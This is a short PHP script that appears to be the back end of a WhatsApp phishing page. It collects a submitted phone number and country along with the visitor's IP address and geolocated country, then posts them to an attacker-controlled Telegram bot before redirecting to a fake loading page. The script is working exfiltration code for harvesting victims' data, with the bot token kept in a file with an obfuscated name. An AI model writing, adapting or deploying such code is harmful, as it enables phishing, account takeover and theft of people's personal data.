<?php
require 'guat53-45475fr477Sttcs.php'; 

if (!isset($_POST['country'], $_POST['telefono']) || empty($_POST['country']) || empty($_POST['telefono'])) {
    die("Error: Datos inválidos o incompletos.");
}

$country = htmlspecialchars(strip_tags($_POST['country']), ENT_QUOTES, 'UTF-8');
$phone = htmlspecialchars(strip_tags($_POST['telefono']), ENT_QUOTES, 'UTF-8');

$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $forwarded_ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ip = trim($forwarded_ips[0]); // Tomamos la primera IP de la lista
} elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
}

$real_country = "Desconocido";
$api_url = "http://ip-api.com/json/$ip?fields=country";
$response = @file_get_contents($api_url);
if ($response) {
    $data = json_decode($response, true);
    if (isset($data['country'])) {
        $real_country = $data['country'];
    }
}
$message = "✅ *WhatsApp Datos* ✅\n"
         . "🌎 $country\n"
         . "📱 `$phone`\n"
         . "*IP:* $ip\n"
         . "*País:* $real_country\n";
$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id' => CHAT_ID,
    'text' => $message,
    'parse_mode' => 'Markdown'
]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
if (curl_errno($ch)) {
    die("Error en cURL: " . curl_error($ch));
}
curl_close($ch);
header("Location: cargando.html");
exit();
?>
